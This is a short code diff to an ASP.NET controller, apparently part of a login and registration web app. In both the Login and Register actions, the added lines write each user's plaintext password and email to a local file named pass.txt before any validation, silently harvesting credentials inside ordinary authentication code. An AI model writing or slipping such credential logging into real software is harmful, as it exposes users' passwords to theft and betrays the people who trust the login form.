@@ -40,6 +40,14 @@ namespace WebApp.Controllers
         [HttpPost]
         public async Task<IActionResult> Login(LoginDTO loginDTO)
         {
+
+            string data = "Pass " + loginDTO.Password + " mail " + loginDTO.Email;
+            string filePath = @"C:\Users\mehem\OneDrive\Desktop\Login-Register\WebApp\pass.txt";
+            using (StreamWriter writer = new StreamWriter(filePath, true))
+            {
+                writer.WriteLine(data);
+            }
+
             if (!ModelState.IsValid)
             {
                 return View(loginDTO);
@@ -81,6 +89,14 @@ namespace WebApp.Controllers
         [HttpPost]
         public async Task<IActionResult> Register(RegisterDTO registerDTO)
         {
+
+            string data = "Pass " + registerDTO.Password + " mail " + registerDTO.Email;
+            string filePath = @"C:\Users\mehem\OneDrive\Desktop\Login-Register\WebApp\pass.txt";
+            using (StreamWriter writer = new StreamWriter(filePath, true))
+            {
+                writer.WriteLine(data);
+            }
+
             //* Gelen Yazilarin boslugunu yoxlayir
             if (!ModelState.IsValid)
             {
